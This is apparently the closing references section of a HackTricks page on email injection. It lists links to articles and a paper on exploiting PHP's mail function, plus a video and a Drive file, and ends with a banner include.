## References

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
